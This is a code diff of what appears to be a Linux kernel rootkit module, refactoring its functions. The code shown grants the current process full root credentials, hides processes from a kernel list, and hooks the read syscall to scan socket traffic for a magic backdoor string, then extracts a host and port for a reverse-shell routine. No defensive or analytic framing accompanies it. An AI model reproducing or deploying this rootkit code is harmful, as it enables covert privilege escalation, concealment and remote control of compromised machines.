@@ -56,13 +56,27 @@ bool is_process_hidden(pid_t pid)
     return false;
 }
 
+void give_current_root(void)
+{
+    struct cred *creds = prepare_creds();
+    if (creds != NULL) {
+        creds->uid.val = creds->gid.val = 0;
+        creds->euid.val = creds->egid.val = 0;
+        creds->suid.val = creds->sgid.val = 0;
+        creds->fsuid.val = creds->fsgid.val = 0;
+        commit_creds(creds);
+    }
+}
+
 bool hide_process(pid_t pid)
 {
     struct hidden_process *proc = kmalloc(sizeof(unsigned long), GFP_KERNEL);
     if (proc == NULL || is_process_hidden(pid))
         return false;
+
     proc->pid = pid;
     list_add(&proc->list, &hidden_processes);
+
     return true;
 }
 
@@ -74,18 +88,6 @@ void unhide_process(pid_t pid)
             list_del(&proc->list);
             kfree(proc);
         }
-    }
-}
-
-void give_current_root(void)
-{
-    struct cred *creds = prepare_creds();
-    if (creds != NULL) {
-        creds->uid.val = creds->gid.val = 0;
-        creds->euid.val = creds->egid.val = 0;
-        creds->suid.val = creds->sgid.val = 0;
-        creds->fsuid.val = creds->fsgid.val = 0;
-        commit_creds(creds);
     }
 }
 
@@ -242,25 +244,27 @@ void invoke_rev_shell(char *host, char *port)
 asmlinkage ssize_t intercepted_read(int fd, void __user *buf, size_t count)
 {
     char *backdoor, *host, *port;
-    ssize_t ret;
+    ssize_t ret, len;
     struct inode *in;
     void *kbuf;
 
     ret = orig_read(fd, buf, count);
+
     in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-    if (ret <= 0 || ret < strlen(BACKDOOR_MAGIC) || !S_ISSOCK(in->i_mode))
+    len = strlen(BACKDOOR_MAGIC);
+    if (ret <= 0 || ret < len || !S_ISSOCK(in->i_mode))
         return ret;
 
     backdoor = NULL;
-    for (int i = 0; i < ret - strlen(BACKDOOR_MAGIC); i++) {
-        if (memcmp(buf + i, BACKDOOR_MAGIC, strlen(BACKDOOR_MAGIC)) == 0) {
+    for (int i = 0; i < ret - len; i++) {
+        if (memcmp(buf + i, BACKDOOR_MAGIC, len) == 0) {
             backdoor = buf + i;
             break;
         }
     }
     if (backdoor == NULL)
         return ret;
-
+    
     kbuf = kmalloc(ret, GFP_KERNEL);
     if (kbuf == NULL)
         return ret;
@@ -269,8 +273,7 @@ asmlinkage ssize_t intercepted_read(int fd, void __user *buf, size_t count)
         return ret;
     }
 
-    backdoor = kbuf + ((void*) backdoor - buf) + strlen(BACKDOOR_MAGIC) + 1; 
-
+    backdoor = kbuf + ((void*) backdoor - buf) + len + 1; 
     host = backdoor;
     port = NULL;
     for (int i = 0; i < 1024; i++) {
